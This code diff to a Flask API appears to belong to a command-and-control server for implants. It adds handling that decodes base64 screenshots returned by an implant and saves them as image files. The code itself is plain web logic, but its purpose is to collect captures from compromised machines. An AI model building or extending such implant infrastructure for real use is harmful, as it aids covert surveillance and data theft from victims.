@@ -6,6 +6,9 @@ from flask_restful import Resource
 from database.db import initialize_db
 from database.models import Task, Result
 from flask_jwt_extended import jwt_required, get_jwt_identity
+import base64
+from io import BytesIO
+from PIL import Image
 
 
 class Tasks(Resource):
@@ -60,9 +63,19 @@ class Results(Resource):
         if 'task_id' not in body:
             return Response("Task ID not provided", mimetype="application/json", status=400)
         body['implant_id'] = str(implant_id)
+        
         task = Task.objects(task_id=body['task_id']).first()
         if not task:
             return Response("Task ID not found", mimetype="application/json", status=404)
+        
+        if task.task_type == "screenshot":
+            imageString = body['result']
+            print(imageString)
+            img_bytes = base64.b64decode(imageString)
+            img = Image.open(BytesIO(img_bytes))
+            img.save(f"images/{task.task_id}.png")
+        
+        
         body['task_obj'] = task.to_json()
         task.delete()
         
